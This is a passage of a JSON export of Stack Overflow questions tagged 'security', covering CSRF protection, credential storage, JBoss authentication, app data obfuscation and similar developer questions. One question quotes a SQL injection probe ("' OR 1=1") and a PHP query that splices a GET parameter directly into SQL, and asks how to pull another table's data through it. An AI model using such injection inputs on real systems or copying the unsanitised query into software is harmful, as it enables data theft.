Framework.</p>\n"},{"tags":["c++","security","usb","rfid"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12954850,"title":"Only allow input from RFID reader C++","body":"<p>Right, I haven't got to coding any of this yet but here's my plan:</p>\n\n<ol>\n<li>User scans RFID card with unique ID on it </li>\n<li>ID is read like keyboard input </li>\n<li>ID relates to DB/flat file and relative information is retrieved</li>\n</ol>\n\n<p>Now this is fairly easy and I can do this, I'm just wondering how I can prevent any other input like from my keyboard being read instead of just from the USB port with the RFID reader (keyboard wedge) attached. </p>\n\n<p>Any help would be greatly appreciated.</p>\n\n<p>Thanks,</p>\n\n<p>Nick</p>\n"},{"tags":["security","text","batch","fingerprint"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":43,"score":0,"question_id":12953672,"title":"identify a txt file by characters and there relevent possitions towards eachother in its contents","body":"<p>I want to make a batch file that can find a specific text file not by name but by its contents better yet not by its entire contents but rather by selected parts of it.</p>\n\n<p>For instance if I have a txt file with the contents</p>\n\n<p>Tom-Dick-and-Harry</p>\n\n<p>I would like my batch file to calculate that if there is a line anywhere in the txt file that contains a T and if 7 characters on from that the letter is a K and two characters on from that the letter is an A the file is recognised as being my file and it is deleted.</p>\n\n<p>Perhaps better explained by a batch file that can find a “fingerprint” this way others can rename my txt file but I will still find it…</p>\n\n<p>Dose anybody know how I could achive this?</p>\n"},{"tags":["spring","security","redirect","login"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12952325,"title":"Spring Security : redirect to previous page after login","body":"<p>I want to redirect to previous page after user login always.</p>\n\n<p>I know that redirect to previous page after login when user denied accessing some page.</p>\n\n<p>But I wonder that all that times, if user directly login after click login link or I redirect login page by force.</p>\n\n<p>When the time that I menthion situation above, redirect to index page after login always.</p>\n\n<p>Please help me...... </p>\n"},{"tags":["security","passwords","gmail","password-protection","autoit"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12385838,"title":"How to store passwords on hard drive the right way?","body":"<p>A script is used to send emails (only with Gmail) daily with user interactions. I would like to store their e-mail in hard drive in a plain text file. What is the right way to do it ?  </p>\n\n<ul>\n<li><p>I know one method would be to ask a user for a password to protect the e-mail password, but this method is pointless because the user should type in a new password every time an email is sent, so I rather ask their e-mail password instead.</p></li>\n<li><p>Another way would be to encrypt the password and using a key with combination of specific informations to user like computer name+username+system+... and use this same key to decrpyt the encrypted password. The problem with this, that I'm using <a href=\"http://www.autoitscript.com/site/\" rel=\"nofollow\">Autoit</a> which is easy to decompile, so when a potencial attacker got the encrypted password, they could theoretically know the encryption key so doesn't matter who many uniq information I use for encrypt the password, they could get it anyway.</p></li>\n<li><p>Another way would be to use OAuth for gmail, so the user doesn't need to type in password at all but I can't do that.</p></li>\n</ul>\n\n<p>Any ideas ?</p>\n"},{"tags":["security","drupal","acl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12952000,"title":"Drupal security ACL","body":"<p>I have a client having website in Drupal . He need to create user and want to assign rights for edit and delete on every column displayed in webpage. I have tried ACL but that didn't work, so Iam planing to have my own code and tables in DB to save table and column permission for each user. But my senior told me that this is security compromise and advise me to use ACL.</p>\n\n<p>What is security risk and what issues can be raised in future if I use my own code and tables to do the job? Plz help me understand this .</p>\n\n<p>Also recommend me how to use ACL or some other work for this scenario....</p>\n"},{"tags":["security","twitter","oauth"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12944405,"title":"Is it safe to store twitter access tokens client side?","body":"<p>After the Twitter oauth process, once I finally get my access_token_key and access_token_secret is it safe to store these in a javascript variable client side?</p>\n\n<p>As far as I can work out nothing can be done with these keys without the consumer_key/consumer_secret?</p>\n"},{"tags":["sql-server","security","administration"],"answer_count":16,"favorite_count":5,"up_vote_count":20,"down_vote_count":0,"view_count":18775,"score":20,"question_id":2330439,"title":"Access is denied when attaching a database","body":"<p>I am using SQL Server 2008 developer edition. I was trying to attach the AdventureWorks2008 database.  </p>\n\n<p>When I tried to attach, I received an \"access is denied\" error. According to the event log, it came from the O/S: </p>\n\n<blockquote>\n  <p>Open failed: Could not open file D:\\ProjectData\\AdventureWorks\\AdventureWorksLT2008_Data.mdf for file number 0.  OS error: 5(Access is denied.).</p>\n</blockquote>\n\n<p>I thought \"NTFS problem\", but System (and I) have modify access to both files.</p>\n\n<p>I found that I can successfully attach the database if I log in as sa, but my user account won't work.</p>\n\n<p>I am a member of the local administrators group on my machine, and I am in the sysadmins role in SQL Server instance.</p>\n\n<p>Any idea why I had to be logged in as sa?</p>\n"},{"tags":["javascript","security","website"],"answer_count":31,"favorite_count":23,"up_vote_count":86,"down_vote_count":4,"view_count":7360,"score":82,"question_id":373818,"title":"What's with those Do-Not-Use JavaScript People?","body":"<p>I really don't understand what the problem is with those people who ask you not to use JavaScript on your site. </p>\n\n<p><img src=\"http://www.beholdgenealogy.com/img/no_javascript.gif\" alt=\"Why the paranoia?\"></p>\n\n<p>I went through all sorts of trouble trying to remove a couple of JavaScript scripts I used on one of my sites <a href=\"http://groups.google.com/group/soc.genealogy.computing/browse_thread/thread/fc76732425d5f24f\" rel=\"nofollow\">to appease a couple of \"complainers\"</a>. A month later, after a relentless attack by spam bots, I decided I better add the JavaScript spam prevention code back in.</p>\n\n<p>JavaScript is obviously used by a lot of programmers. It is currently the 6th most popular tag here at Stack Overflow. It is used on practically every single website that I know of. </p>\n\n<p>The claim that it is a security risk seems bogus to me. I've had JavaScript on in my browser for as long as I remember, and not once have I found out that anything malicious has happened.</p>\n\n<p>JavaScript has, of course, been extended into AJAX. And AJAX is the thing that makes the wonderful world of Web 2.0 work. And that includes this wonderful Stack Overflow site.</p>\n\n<p>So is there something I'm missing? Is there something wrong with JavaScript that I'm not aware of?</p>\n\n<hr>\n\n<p>Follow-up:</p>\n\n<p>I am flabbergasted by the response to my Question.</p>\n\n<p>The responses are strong and vociferous from the Anti-JavaScript people.</p>\n\n<p>There was one pro-JavaScript comment, and it was voted down (as I write this to -2) by the others.</p>\n\n<p>I turned JavaScript off to add this follow-up. I immediately notice three obvious things (There might be more):</p>\n\n<ol>\n<li><p>A big annoying white on red banner at the top of each page saying: \"Stack Overflow works best with JavaScript enabled\". (Annoyance) </p></li>\n<li><p>Comments cannot be viewed at all or added. You can't vote up or vote down. You can't select the accepted answer. (Loss of functionality)</p></li>\n<li><p>Of course none of the AJAX stuff works. I don't have access to the line of editing tools above this entry box, and I can't see the preview as I type this. (Inconveniences)</p></li>\n</ol>\n\n<p>So as far as I am concerned, turning your JavaScript off results in Annoyances, Loss of Functionality, and Inconvenience.</p>\n\n<p>I'm sorry for the handicapped people who have no JavaScript support, but I still don't get why so many of you are so religiously against using it. </p>\n\n<p>Personally, I love what AJAX and its beautiful interfaces and enhanced functionality are doing to the Web. I try to add such features to my site and it annoys me when the Anti-JavaScript people ask me - no, demand of me to take it out because they can't access them. </p>\n\n<p>But how many of you use Stack Overflow with JavaScript off? None I would expect. Your answer would be that you turn it on for sites you trust like Stack Overflow.</p>\n\n<p>Okay. If I make a site that uses Ajax or JavaScript, then I'm fine with you turning it off until you decide to trust my site. But don't expect me to be required to give you all the functionality that I do to people who trust me. Even Stack Overflow doesn't. </p>\n\n<p>If someone wants to embellish this idea, I'll give them the accepted answer.</p>\n\n<hr>\n\n<p>Also see the question:  <a href=\"http://stackoverflow.com/questions/337570/is-it-worth-it-to-code-different-functionality-for-users-with-javascript-disabl\">Is it worth it to code different functionality for users with JavaScript disabled?</a></p>\n\n<p>and <a href=\"http://stackoverflow.com/questions/337570/is-it-worth-it-to-code-different-functionality-for-users-with-javascript-disabl#378681\">my answer to that question</a> (which, when I last looked, had been voted down by the Do-Not-Use JavaScript people).</p>\n\n<hr>\n\n<p>Followup.  I found the following opinion about JavaScript at the <a href=\"http://www.polepositionmarketing.com/library/wp-spamfree/#wpsf_how_it_works\" rel=\"nofollow\">WP-SpamFree WordPress Plugin page</a>:</p>\n\n<p>\"Most of the spam hitting your blog originates from bots. Few bots can process JavaScript. Few bots can process cookies. Fewer still, can handle both. In a nutshell, this plugin uses a combo of JavaScript and cookies (on steroids) to weed out the humans from spambots, preventing 99%+ of automated spam from ever getting to your site. Almost 100% of web site visitors will have these turned on by default, so this type of solution works silently in the background, with no inconveniences. There are extremely few users (less than 2%) that have JavaScript and/or cookies turned off by default, but they will be prompted to turn those back on to post their comment.</p>\n\n<p>Stats show that among all Internet users, less than 2% have JavaScript turned off, and less than 1% have cookies turned off. This requirement isn’t anything out of the ordinary because most modern websites require the use of JavaScript and cookies for key features — AJAX, for example, won’t work if JS is disabled.</p>\n\n<p><strong>Overall, the very few that might be inconvenienced because they have JS and cookies turned off will be far fewer than the 100% who would be annoyed by CAPTCHA’s, challenge questions, and other validation methods.</strong>\"</p>\n"},{"tags":["sql","sql-server","security","sql-server-2012","sspi"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":12944273,"title":"correct security and user setup for sql server database","body":"<p>I am currently on setting a sql server database on a database server. A front end web application running off a web server communicates to the database.</p>\n\n<p>What is the best approach for setting up users to access the database etc. My plan was:</p>\n\n<ul>\n<li>On web server, create a local user which the application pool runs under and assign it the necessary rights </li>\n<li>On database server, create a sql user that can log in to the database, have necessary permissions on tables/db's etc. This user is what is included in the connection string from the mvc web application to connect to the database.</li>\n</ul>\n\n<p>Is this the best approach - I have read in to mixed mode sql sever with sspi etc etc and I am little confused as to the best secure setup. Any tips or further information would be great.</p>\n\n<p>I have read that sspi is a means of providing an integrated secure trust relationship between the web servers and the back end database servers, without having to transmit sensitive user and password information. Buy I am wondering if what I have outlined sufficent. Note sensitive information such as SSN, credit card numbers etc may be stored in the sql server 2012 database. </p>\n"},{"tags":["iphone","objective-c","ios","security","secure-coding"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":12946664,"title":"How do I prevent format string attacks and buffer overruns on iOS?","body":"<p>Apple's <a href=\"https://developer.apple.com/library/mac/#documentation/security/conceptual/SecureCodingGuide/Articles/ValidatingInput.html\" rel=\"nofollow\">Secure Coding Guide</a> documentation provides guidance on:</p>\n\n<ul>\n<li>format string attacks</li>\n<li>buffer overflows</li>\n</ul>\n\n<p>What is not clear (to me, anyway) is how to prevent format string attacks and buffer overruns when using NSString.</p>\n\n<p>How do I go about defending against such attacks?\nAre there any categories I can apply to protect against this?\nIs there a \"secure\" NSString equivalent I can use?</p>\n"},{"tags":["security","hypervisor","end-user"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":14,"score":-1,"question_id":12946633,"title":"attestation user log-in hypervisor","body":"<p>Since the current operating system is malicious and untrusted (because of the kernel rookit), I'm focused on how to make use of the hypervisor to attest a user when he/she indeed logs on a remote terminal, considering the OS would cheat me. </p>\n\n<p>I'm considering of constructing a trusted path between the end-user and the hypervisor, but it seems to a kind of protection not attestation. </p>\n\n<p>Also, semantic check to the user-input is not possible, either, which can be easily hampered by the OS. </p>\n\n<p>I wanna ask some advice. \nThanks a lot.</p>\n"},{"tags":["php","security","magento","csrf","owasp"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":12945681,"title":"Magento CSRF protection","body":"<p>I am looking at custom forms in Magento. I saw these tutorials</p>\n\n<p><a href=\"http://fastdivision.com/2012/03/29/diy-magento-create-ajax-login-registration-forms-for-your-magento-theme/\" rel=\"nofollow\">http://fastdivision.com/2012/03/29/diy-magento-create-ajax-login-registration-forms-for-your-magento-theme/</a></p>\n\n<p><a href=\"http://inchoo.net/ecommerce/magento/magento-email/magento-custom-email-contact-form-with-notification-system/\" rel=\"nofollow\">http://inchoo.net/ecommerce/magento/magento-email/magento-custom-email-contact-form-with-notification-system/</a></p>\n\n<p>I did not see any mention of CSRF prevention, like checking a client token with one stored in a user session. I also looked in the Magento Contact Us form, and saw this but I do not think it relates to CSRF:</p>\n\n<pre><code>&lt;input type=\"text\" name=\"hideit\" id=\"hideit\" value=\"\" style=\"display:none !important;\"&gt;\n</code></pre>\n\n<p>Does Magento have any default code for preventing CSRF? Does the $this->getRequest()->getParams() method of Mage_Core_Controller_Front_Action do anything automatically to prevent CSRF that I may be missing?</p>\n"},{"tags":["web-services","security","web-security","w3c"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":20,"score":-1,"question_id":12946225,"title":"w3c-like user security certification?","body":"<p>Is there anything like the W3C website inspectors for user security? To make sure that passwords are hashed securely with BCrypt and stuff like that? I'm just wondering because I'm trying to develop a portfolio where I could showcase \"secure\" php code with a little icon like W3C's standards checkers. </p>\n"},{"tags":["php","security","encryption","config"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":12945513,"title":"How do I store my website's config file securely?","body":"<p>I have a config.php file for my website that I store outside of the publicly accessible web directory and it contains my password information for a gmail account I use to send mail for the site and my database connection credentials. I don't like the idea of saving the password as a plaintext variable and was looking for some way to have this data more securely saved. Beyond blocking read access to the directory from users other than me, what can I do to secure this information?</p>\n"},{"tags":["asp.net","security","csrf","owasp"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":320,"score":1,"question_id":8500249,"title":"How to Implement CSRF Guard in ASP.Net","body":"<p>I need to implement CSRF(Cross Site Request Forgery) Guard in my code (asp.net).\nThough I got a library from OWASP, implementing it is a pain since no documentation is given. Can someone provide me an easier way to implement csrf guard in .net, or configure OWASP library correctly ?</p>\n\n<p>Thanks</p>\n\n<p>-Chandan</p>\n"},{"tags":["java","security","gwt","exception-handling","client-server"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12923172,"title":"GWT :: process server errors in single place on client side","body":"<p>It is possible to define single point of request handling with special kind of handler with Guice support, like below:</p>\n\n<pre><code>@Singleton\npublic class GuiceRemoteServiceServlet extends RemoteServiceServlet {\n    @Inject\n    private Injector injector;\n\n    @Override\n    public String processCall(String payload) throws SerializationException {\n        RPCRequest req = RPC.decodeRequest(payload, null, this);\n\n        RemoteService service = getServiceInstance(\n                req.getMethod().getDeclaringClass());\n\n        return RPC.invokeAndEncodeResponse(service, req.getMethod(),\n                req.getParameters(), req.getSerializationPolicy());\n\n    }\n\n    @SuppressWarnings({\"unchecked\"})\n    private RemoteService getServiceInstance(Class serviceClass) {\n        return (RemoteService) injector.getInstance(serviceClass);\n    }\n}\n</code></pre>\n\n<p>basically, this is ideal place to do some security-related stuff, like checking if user is authenticated. I need to ensure that the user is authenticated on <strong>any request</strong> to the server. So in general I will add method <em>validateUser</em>, which will return true/false or throw an exception. This method will be invoked within <strong>processCall</strong> in the code above.</p>\n\n<p>Now the question is - how do I handle this authentication response on <strong>client side</strong>? I want to put it into <strong>single place</strong>, and be sure that any service will has this user validation enabled by default. Any new service must be \"secured\" without adding any security-related code. So no copy/paste of this code in \"onFailure\" methods or something like that.</p>\n\n<p>Any thoughts?</p>\n"},{"tags":["php","security","session","session-hijacking","suphp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12926524,"title":"suPHP Security With Sessions","body":"<p>I am trying to better understand suPHP.</p>\n\n<p>I have obviously found the suPHP documentation on google, and have found the generic answers for what it is and does, but I am confused on how it can help with session security and preventing session hijacking.</p>\n\n<p>If anyone could clarify this for me, I'd be grateful. Google isn't yielding any good results!</p>\n"},{"tags":["ruby-on-rails","ajax","facebook","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12943320,"title":"Ajax security of Facebook apps? (Ruby on Rails)","body":"<p>I have a simple voting app where I would like the vote event to be done via ajax. </p>\n\n<pre><code>$.ajax({\n  type: 'POST',\n  url: '/vote',\n  data: '',\n})\n</code></pre>\n\n<p>However, the signed_request is not passed by FB as a parameter for ajax calls. What is the best practice for verifying identity of an ajax request for Facebook apps?</p>\n"},{"tags":["security","node.js"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12932731,"title":"How to protect Node.JS web soket server against connection bomb?","body":"<p>Anyone can request to connect to my real-time application server written by Node.JS which started on port 80.</p>\n\n<p>That means anyone can send large number of curl requests to bomb my socket server causes the connection overflow.\nAny way to detect curl request and reject them?</p>\n\n<p>Thank you.</p>\n"},{"tags":["java","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":39,"score":-1,"question_id":12926229,"title":"Does endsWith consider a path's file extension, and is this a security vulnerability?","body":"<p>When I call <code>endsWith(\".pdf\")</code>, would this open malware.pdf.exe or just malware.pdf?</p>\n\n<pre><code>String sFileName = request.getParameter(\"fName\");\nif (sFileName.toLowerCase().endsWith(\".pdf\"))\n// open file\nelse\n// don’t open the file\n</code></pre>\n"},{"tags":["php","security","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":66,"score":2,"question_id":12942065,"title":"Can $_SERVER['REMOTE_USER'] be spoofed?","body":"<p>I have a situation where I am opening a file based on the $_SERVER['REMOTE_USER'] variable.  I don't think this is spoof-able but would just like to confirm.  I do not want to make myself vulnerable to the reading of arbitrary files:</p>\n\n<pre><code>   &lt;?\n      $user = $_SERVER['REMOTE_USER'];\n      $fp = fopen(\"./$user.png\",\"r\");\n   ?&gt;\n</code></pre>\n"},{"tags":["security","jboss7.x"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":322,"score":0,"question_id":11027918,"title":"Using JBoss 7 DatabaseServerLoginModule with a remote client","body":"<p>we are currently porting a JEE application from JBoss 6 to JBoss 7.1.1. The application has no web interface but only a remote client based on Eclipse RCP. To authenticate clients the remote client uses a \"javax.security.auth.login.LoginContext\" to provide the required credentials. The Server is using the \"DatabaseServerLoginModule\" to authenticate all access to the applications security domain.</p>\n\n<p>To port that application to JBoss 7.1.1 I've done the following:</p>\n\n<p>I've configured a security-domain in the \"standalone-full.xml\":</p>\n\n<pre><code>&lt;security-domain name=\"myDomain\" cache-type=\"default\"&gt;\n  &lt;authentication&gt;\n    &lt;login-module code=\"org.jboss.security.auth.spi.DatabaseServerLoginModule\" flag=\"required\"&gt;\n      &lt;module-option name=\"dsJndiName\" value=\"jdbc/myDS\"/&gt;\n      &lt;module-option name=\"principalsQuery\" value=\"select u.password from users u left join authorizables a on u.id=a.id where a.name=?\"/&gt;\n      &lt;module-option name=\"rolesQuery\" value=\"SELECT 'user', 'Roles' FROM authorizables WHERE name=?\"/&gt;\n    &lt;/login-module&gt;\n  &lt;/authentication&gt;\n&lt;/security-domain&gt;   \n</code></pre>\n\n<p>Next I've configured a security-realm:</p>\n\n<pre><code>&lt;security-realm name=\"MyAppRealm\"&gt;\n  &lt;authentication&gt;\n    &lt;jaas name=\"myDomain\"/&gt;\n  &lt;/authentication&gt;\n&lt;/security-realm&gt;\n</code></pre>\n\n<p>And last I've bound the remoting connector to my custom realm</p>\n\n<pre><code>&lt;connector name=\"remoting-connector\" socket-binding=\"remoting\" security realm=\"MyAppRealm\"/&gt;\n</code></pre>\n\n<p>Now when trying to access the server the following exception is thrown:</p>\n\n<pre><code>ERROR connection:99 - JBREM000200: Remote connection failed: javax.security.sasl.SaslException: Authentication failed: all available authentication mechanisms failed\n\njavax.naming.NamingException: Failed to create remoting connection [Root exception is java.lang.RuntimeException: javax.security.sasl.SaslException: Authentication failed: all available authentication mechanisms failed]\nat org.jboss.naming.remote.client.ClientUtil.namingException(ClientUtil.java:36)\nat org.jboss.naming.remote.client.InitialContextFactory.getInitialContext(InitialContextFactory.java:121)\nat javax.naming.spi.NamingManager.getInitialContext(NamingManager.java:667)\nat javax.naming.InitialContext.getDefaultInitCtx(InitialContext.java:288)\nat javax.naming.InitialContext.init(InitialContext.java:223)\nat javax.naming.InitialContext.&lt;init&gt;(InitialContext.java:197)\nat my.SampleClient.login(SampleClient.java:110)\n... 26 more\nCaused by: java.lang.RuntimeException: javax.security.sasl.SaslException: Authentication failed: all available authentication mechanisms failed\nat org.jboss.naming.remote.protocol.IoFutureHelper.get(IoFutureHelper.java:87)\nat org.jboss.naming.remote.client.NamingStoreCache.getRemoteNamingStore(NamingStoreCache.java:56)\nat org.jboss.naming.remote.client.InitialContextFactory.getOrCreateCachedNamingStore(InitialContextFactory.java:166)\nat org.jboss.naming.remote.client.InitialContextFactory.getOrCreateNamingStore(InitialContextFactory.java:139)\nat org.jboss.naming.remote.client.InitialContextFactory.getInitialContext(InitialContextFactory.java:104)\n... 31 more\nCaused by: javax.security.sasl.SaslException: Authentication failed: all available authentication mechanisms failed\nat org.jboss.remoting3.remote.ClientConnectionOpenListener$Capabilities.handleEvent(ClientConnectionOpenListener.java:365)\nat org.jboss.remoting3.remote.ClientConnectionOpenListener$Capabilities.handleEvent(ClientConnectionOpenListener.java:214)\nat org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:72)\nat org.xnio.channels.TranslatingSuspendableChannel.handleReadable(TranslatingSuspendableChannel.java:189)\nat org.xnio.channels.TranslatingSuspendableChannel$1.handleEvent(TranslatingSuspendableChannel.java:103)\nat org.xnio.ChannelListeners.invokeChannelListener(ChannelListeners.java:72)\nat org.xnio.nio.NioHandle.run(NioHandle.java:90)\nat org.xnio.nio.WorkerThread.run(WorkerThread.java:184)\nat ...asynchronous invocation...(Unknown Source)\nat org.jboss.remoting3.EndpointImpl.doConnect(EndpointImpl.java:270)\nat org.jboss.remoting3.EndpointImpl.doConnect(EndpointImpl.java:251)\nat org.jboss.remoting3.EndpointImpl.connect(EndpointImpl.java:349)\nat org.jboss.remoting3.EndpointImpl.connect(EndpointImpl.java:333)\nat org.jboss.naming.remote.client.EndpointCache$EndpointWrapper.connect(EndpointCache.java:105)\nat org.jboss.naming.remote.client.NamingStoreCache.getRemoteNamingStore(NamingStoreCache.java:55)\n... 34 more\n</code></pre>\n\n<p>Has anybody an idea what I've done wrong. Can anybody give me a hint on how to setup this scenario. I've been searching in the JBoss documentation but haven't found a solution for this problem.</p>\n\n<p>Regards,</p>\n\n<p>Thomas</p>\n"},{"tags":["security","internet-explorer"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12941366,"title":"URL with SSL port not opening in IE 8","body":"<p>Internet Explorer cannot open the SSL site URL  [https://localhost:7002/test].\nBut can open the url [http://localhost:7001/test]</p>\n\n<p>The URL stopped working all of a sudden. Is there a way to fix this issue.</p>\n"},{"tags":["php","security","sql-injection","injection","code-injection"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12936208,"title":"SQL injection that retrieves all data in a different table that the one in the query","body":"<p>I own a PHP system that works on a virtual server \"Wamp\" on windows XP. I am trying to detect the vulnerabilities in my system using SQL injection technique. </p>\n\n<p>I have tried the basic ways of injection such as \" ' OR 1=1 \" and I detected several problems. However, I am stuck on the following issue:</p>\n\n<p>I have the following line of code in my system:</p>\n\n<pre><code>$sql2=\"SELECT * FROM $table1 WHERE question_id='$id'\";\n</code></pre>\n\n<p>After this line of code, I execute the query and display the result like this:</p>\n\n<pre><code>$result2=mysql_query($sql2);\n\nwhile($rows=mysql_fetch_array($result2)){\n?&gt;\n&lt;table width=\"400\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"1\" bgcolor=\"#CCCCCC\"&gt;\n&lt;tr&gt;\n&lt;td&gt;&lt;table width=\"100%\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#FFFFFF\"&gt;\n&lt;tr&gt;\n&lt;td bgcolor=\"#F8F7F1\"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/td&gt;\n&lt;td bgcolor=\"#F8F7F1\"&gt;:&lt;/td&gt;\n&lt;td bgcolor=\"#F8F7F1\"&gt;&lt;?php echo $rows['a_id']; ?&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n.......\n.......\n</code></pre>\n\n<p>Note that the value of the variable \"$id\" is sent from the previous page as _GET[] parameter.</p>\n\n<p>My problem is, I am trying to inject the parameter id=2? (2 is an example) that is being sent from the previous page. Here's an example:</p>\n\n<pre><code>http://localhost/PHPforum/view_topic.php?id=2\n</code></pre>\n\n<p>I am looking for a way to inject the value of the variable \"$id\" in order to make it display the data of different table (table2) instead of table1. It's fine that I display both tables but I need table2 data to be displayed by that injection.</p>\n\n<p>How can I possibly do that?</p>\n\n<p>Again, I am not trying to attack any system, It's a system that I own and I am trying to detect its vulnerabilities. </p>\n"},{"tags":["php","iphone","security","encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12933322,"title":"iPhone XML data to be encrypted","body":"<p>Our application gets all the data from PHP/Mysql server in XML format</p>\n\n<p>but now client don't want data to be appeared as it is,\nhe fears, anyone who knows those .php file links can access all data on server and will become a competitor to him.</p>\n\n<p>so i want to know is there any encryption available which i can use in php and decryption in ios.</p>\n\n<p>or SSL is the only option?</p>\n\n<p>EDIT: our php file returns XML data and client is bothered that competitors can get data,\nso i want to send encrypted data into XML and decrypt it in iPhone, so is there any good solution for that? </p>\n\n<p>Thanks</p>\n"},{"tags":["security","magento","e-commerce","brute-force","magento-1.7"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":101,"score":1,"question_id":12549585,"title":"Magento - Security and brute force","body":"<p>I'm trying to decide whether to use Magento or create my own platform and I was wondering about security. Does Magento's code include some sort of brute force protection? If not, is this not something important?</p>\n"},{"tags":["java","security","seam"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12930354,"title":"role field not stroed in database after identitymanager role creation","body":"<p>I'm using seam 2.1.2 security and i create a role using identitymanager by jsf richfaces GUI. in creation process i would add a \"description\" to role created in database , the creation of role is ok but the description field is not added, i must update the role ( in other operation by GUI)  to see the decsription field stored in databse. the question is what have i to do to store the \"description\" filed in creation operation ? thnx for your help </p>\n\n<p>bellow is my code : </p>\n\n<pre><code>  public boolean createRole(Role role) {\n    IdentityManager identityManager = IdentityManager.instance();\nlogger.info(\"creating role:\" + role.getRoleName());\nif (identityManager.roleExists(role.getRoleName())) {\n    return false;\n}\nif (identityManager.createRole(role.getRoleName())) {\n    completeRolePersistence(role);\n    return true;\n}\nreturn false;\n}\n</code></pre>\n\n<p>and the completeRolePersistence method : </p>\n\n<pre><code>public void completeRolePersistence(Role role) {\n    logger.info(\"setting additional info to role...\");\n    Query query = em.createNamedQuery(\"UPDT_ADDITIONALS\");\n    query.setParameter(\"name\", role.getRoleName())\n            .setParameter(\"description\", role.getDescription())\n            .setParameter(\"level\", role.getRoleLevel());\n    int updated = query.executeUpdate();\n    logger.info(\"roles updated with desc : \" + updated);\n}\n</code></pre>\n\n<p>it seem that the query is not executed , i print in log </p>\n\n<pre><code>roles updated with desc : 0\n</code></pre>\n\n<p>thnx for your help</p>\n"},{"tags":["security","phonegap","cordova-2.0.0"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12938827,"title":"See source code from PhoneGap/Cordova web view","body":"<p>I am using PhoneGap/Cordova 2.0 to build IOS and Android apps. I am little worried about code security using Cordova, as all code is in HTML, Javascript and not compiled. \nIs there a way to see the code from app UIWebView? Can someone do view source code from UIWebView. \nIf so, then how to obfuscate the code?</p>\n\n<p>Thank you</p>\n"},{"tags":["iphone","ios","security","sqlite","encryption"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":12938517,"title":"Light protection for SQLite database on the iPhone","body":"<p>There are a bunch of questions on how to protect a SQLite database on the iPhone here. Those questions are mostly about:</p>\n\n<ul>\n<li>preventing data tampering;</li>\n<li>protecting user's personal data using a passwords that should be entered by a user.</li>\n</ul>\n\n<p>but we have a bit different situation: </p>\n\n<ul>\n<li>we have an app that is distributed with a sqlite database;</li>\n<li>the database contains publicly available information, but gathering all that information in one place requires some effort, and we don't want competitors to have a simple way to access our data;</li>\n<li>all the database content is available through the application UI, basically the purpose of the app is to nicely present that data. So it is possible to recreate the database through the UI, while there are about 50k records x 40 fields per record, which are going to be updated with each version, so manual scraping will take some time. Also it's probably possible to use some automated screen scraping to extract the data, but again it requires some effort;</li>\n<li>because of the previous point, we are not looking for some industrial grade data protection, we just want to prevent anybody from accessing the application bundle on a jailbroken device and copying the database out of it.</li>\n</ul>\n\n<p>I think that we need some kind of fancy obfuscation of the column contents. Probably we should encrypt the columns using some key that is unique to the app, and can't be accessed by anybody else (if such key exist in the AppStore).</p>\n\n<p>Any suggestions and best practices are appreciated,</p>\n\n<p>Thank you</p>\n"},{"tags":["php","security","passwords","hash","password-protection"],"answer_count":1,"favorite_count":6,"up_vote_count":4,"down_vote_count":0,"view_count":1441,"score":4,"question_id":3290283,"title":"What is a good way to produce a random \"site salt\" to be used in creating password retrieval tokens?","body":"<p>I would like to create a site-wide hash to be used as salt in creating password retrieval tokens. I have been bouncing around stackoverflow trying to get a sense of the best way to do this. </p>\n\n<p>Here's the reset process:</p>\n\n<p>When a user requests a password reset email the code generates a retrieval token:</p>\n\n<pre><code>$token = hash_hmac('sha256', $reset_hash* , $site_hash)\n</code></pre>\n\n<p>*$reset_hash is a hash created using phpass HashPassword() function, saved in the user table.</p>\n\n<p>I then send the token in a URL to the users email address. They 